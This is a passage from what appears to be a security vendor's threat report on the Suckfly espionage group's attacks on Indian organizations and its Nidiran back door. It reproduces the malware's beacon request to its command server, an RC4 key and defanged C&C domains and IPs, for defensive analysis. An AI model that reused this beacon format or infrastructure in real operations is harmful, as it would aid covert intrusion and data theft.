Since then we have\nidentified a number of attacks over a two-year period, beginning in April 2014, which we attribute to\nSuckfly. The attacks targeted high-profile targets, including government and commercial organizations.\nThese attacks occurred in several different countries, but our investigation revealed that the primary\ntargets were individuals and organizations primarily located in India.\n\nWhile there have been several Suckfly campaigns that infected organizations with the group’s custom\n[malware Backdoor.Nidiran, the Indian targets show a greater amount of post-infection activity than targets](https://www.symantec.com/security_response/writeup.jsp?docid=2015-120123-5521-99)\nin other regions. This suggests that these attacks were part of a planned operation against specific targets\nin India.\n\n**Campaign activity in India**\nThe first known Suckfly campaign began in April of 2014. During our investigation of the campaign, we\nidentified a number of global targets across several industries who were attacked in 2015. Many of the\ntargets we identified were well known commercial organizations located in India. These organizations\nincluded:\n\nOne of India's largest financial organizations\nA large e-commerce company\nThe e-commerce company's primary shipping vendor\n\n\n-----\n\nOne of India s top five IT firms\nA United States healthcare provider's Indian business unit\nTwo government organizations\n\nSuckfly spent more time attacking the government networks compared to all but one of the commercial\ntargets. Additionally, one of the two government organizations had the highest infection rate of the Indian\ntargets. Figure 1 shows the infection rate for each of the targets.\n\n_Figure 1. Infection rates of Indian targets_\n\nIndian government org #2 is responsible for implementing network software for different ministries and\ndepartments within India's central government. The high infection rate for this target is likely because of its\naccess to technology and information related to other Indian government organizations.\n\nSuckfly's attacks on government organizations that provide information technology services to other\ngovernment branches is not limited to India. It has conducted attacks on similar organizations in Saudi\nArabia, likely because of the access that those organizations have.\n\nSuckfly's targets are displayed in figure 2 by their industry, which provides a clearer view of the group’s\noperations. Most of the group's attacks are focused on government or technology related companies and\norganizations.\n\n\n-----\n\n_Figure 2. Suckfly victims, by industry_\n\n**Suckfly attack lifecycle**\nOne of the attacks we investigated provided detailed insight into how Suckfly conducts its operations. In\n2015, Suckfly conducted a multistage attack between April 22 and May 4 against an e-commerce\norganization based in India. Similar to its other attacks, Suckfly used the Nidiran back door along with a\nnumber of hacktools to infect the victim's internal hosts. The tools and malware used in this breach were\n[also signed with stolen digital certificates. During this time the following events took place:](http://www.symantec.com/connect/blogs/keeping-your-code-signing-certificate-straight-and-narrow)\n\n_Figure 3. Suckfly attack lifecycle_\n\n\n-----\n\n1. Suckfly s first step was to identify a user to target so the attackers could attempt their initial breach\n\ninto the e-commerce company's internal network. We don't have hard evidence of how Suckfly\nobtained information on the targeted user, but we did find a large open-source presence on the initial\ntarget. The target's job function, corporate email address, information on work related projects, and\npublicly accessible personal blog could all be freely found online.\n\n2. On April 22, 2015, Suckfly exploited a vulnerability on the targeted employee's operating system\n\n(Windows) that allowed the attackers to bypass the User Account Control and install the Nidiran back\ndoor to provide access for their attack. While we know the attackers used a custom dropper to install\nthe back door, we do not know the delivery vector. Based on the amount of open-source information\navailable on the target, it is feasible that a spear-phishing email may have been used.\n\n3. After the attackers successfully exploited the employee’s system, they gained access to the e\ncommerce company's internal network. We found evidence that Suckfly used hacktools to move\nlatterly and escalate privileges. To do this the attackers used a signed credential-dumping tool to\nobtain the victim's account credentials. With the account credentials, the attackers were able to\naccess the victim's account and navigate the internal corporate network as though they were the\nemployee.\n\n4. On April 27, the attackers scanned the corporate internal network for hosts with ports 8080, 5900,\n\nand 40 open. Ports 8080 and 5900 are common ports used with legitimate protocols, but can be\nabused by attackers when they are not secured. It isn't clear why the attackers scanned for hosts\nwith port 40 open because there isn't a common protocol assigned to this port. Based on Suckfly\nscanning for common ports, it’s clear that the group was looking to expand its foothold on the ecommerce company's internal network.\n\n5. The attackers’ final step was to exfiltrate data off the victim’s network and onto Suckfly’s\n\ninfrastructure. While we know that the attackers used the Nidiran back door to steal information\nabout the compromised organization, we do not know if Suckfly was successful in stealing other\ninformation.\n\nThese steps were taken over a 13-day period, but only on specific days. While tracking what days of the\nweek Suckfly used its hacktools, we discovered that the group was only active Monday through Friday.\nThere was no activity from the group on weekends. We were able to determine this because the attackers’\nhacktools are command line driven and can provide insight into when the operators are behind keyboards\nactively working. Figure 4 shows the attackers’ activity levels throughout the week.\n\n\n-----\n\n_Figure 4. Signed hacktools in use against targets, by day_\n\n[This activity supports our theory, mentioned in the previous Suckfly blog, that this is a professional](https://community.broadcom.com/symantecenterprise/viewdocument?DocumentKey=62e325ae-f551-4855-b9cf-28a7d52d1534&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments)\norganized group.\n\n**Suckfly's command and control infrastructure**\nSuckfly made its malware difficult to analyze to prevent their operations from being detected. However, we\nwere able to successfully analyze Suckfly malware samples and extract some of the communications\nbetween the Nidiran back door and the Suckfly command and control (C&C) domains.\n\nWe analyzed the dropper, which is an executable that contains the following three files:\n\n1. dllhost.exe: The main host for the .dll file\n2. iviewers.dll: Used to load encrypted payloads and then decrypt them\n3. msfled: The encrypted payload\n\nAll three files are required for the malware to run correctly. Once the malware has been executed, it\nchecks to see if it has a connection to the internet before running. If the connection test is successful, the\nmalware runs and attempts to communicate with the C&C domain over ports 443 and 8443. In the\nsamples we analyzed we found the port and C&C information encrypted and hardcoded into the Nidiran\nmalware itself. The Nidiran back door made the following initial communication request to the Suckfly C&C\ndomain:\n\nGET /gte_ok0/logon.php HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR\n1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.4506.2152;\n.NET CLR 3.5.30729)\nHost: REDACTED\nConnection: Keep-Alive\n**Cookie:**\n**dfe6=OIAXUNXWn9CBmFBqtwEEPLzwRGmbMoNR7C0nLcHYa+C1tb4fp7ydcZSmVZ1c4akergWcQQ==**\n\n\n-----\n\nThe interesting information being transmitted to the C&C server in the initial request is located in the\ncookie which is comprised of the following:\n\n[COOKIE NAME]=[RC4 ENCRYPTED + B64 ENCODED DATA FROM VICTIM]\n\nThe key for the RC4 encryption in this sample is the hardcoded string “h0le”. Once the cookie data is\ndecoded, Suckfly has the network name, hostname, IP address, and the victim's operating system\ninformation.\n\nInformation about the C&C infrastructure identified in our analysis of Suckfly activity can be seen in Table\n1.\n\n**Domain** **Registration** **IP address** **Registration date**\n\naux.robertstockdill[.]com kumar.pari@yandex[.]com Unknown April 1, 2014\n\nssl.2upgrades[.]com kumar.pari@yandex[.]com 176.58.96.234 July 5, 2014\n\nbss.pvtcdn[.]com registrar@mail.zgsj[.]com 106.184.1.38 May 19, 2015\n\nssl.microsoft-security-center[.]com Whoisguard Unknown July 20, 2015\n\nusv0503.iqservs-jp[.]com Domain@quicca[.]com 133.242.134.121 August 18, 2014\n\nfli.fedora-dns-update[.]com Whoisguard Unknown Unknown\n\n_Table. Suckfly C&C infrastructure information_\n\n**Conclusion**\nSuckfly targeted one of India’s largest e-commerce companies, a major Indian shipping company, one of\nIndia’s largest financial organizations, and an IT firm that provides support for India’s largest stock\nexchange. All of these targets are large corporations that play a major role in India’s economy. By targeting\nall of these organizations together, Suckfly could have had a much larger impact on India and its economy.\nWhile we don't know the motivations behind the attacks, the targeted commercial organizations, along with\nthe targeted government organizations, may point in this direction.\n\nSuckfly has the resources to develop malware, purchase infrastructure, and conduct targeted attacks for\nyears while staying off the radar of security organizations. During this time they were able to steal digital\ncertificates from South Korean companies and launch attacks against Indian and Saudi Arabian\ngovernment organizations. There is no evidence that Suckfly gained any benefits from attacking the\ngovernment organizations, but someone else may have benefited from these attacks.\n\nThe nature of the Suckfly attacks suggests that it is unlikely that the threat group orchestrated these\nattacks on their own. We believe that Suckfly will continue to target organizations in India and similar\norganizations in other countries in order to provide economic insight to the organization behind Suckfly's\noperations.\n\n\n-----\n\n**Protection**\nSymantec has the following detections in place to protect against Suckfly’s malware:\n\n**Antivirus**\n\n**Intrusion prevention system**\n\n\n-----",
